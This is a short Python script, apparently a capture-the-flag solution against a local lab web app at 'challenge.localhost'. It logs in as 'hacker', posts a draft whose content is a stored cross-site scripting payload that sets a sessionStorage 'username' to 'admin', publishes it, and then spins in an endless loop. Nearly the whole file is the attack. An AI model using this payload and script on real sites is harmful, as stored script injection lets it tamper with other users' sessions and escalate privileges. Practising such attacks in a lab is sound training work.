import requests
session=requests.Session()
base_url="http://challenge.localhost:80"
login_data={"username":"hacker","password":"1337"}
response1=session.post(base_url+"/login",data=login_data)
print(response1.text)
payload="<script>sessionStorage.setItem('username', 'admin')</script>"
draft_data={"content":payload,"publish":"1"}
response2=session.post(base_url+"/draft",data=draft_data)
print(response2.text)
response3=session.get(base_url+"/publish")
print(response3.text)
while True:
    continue
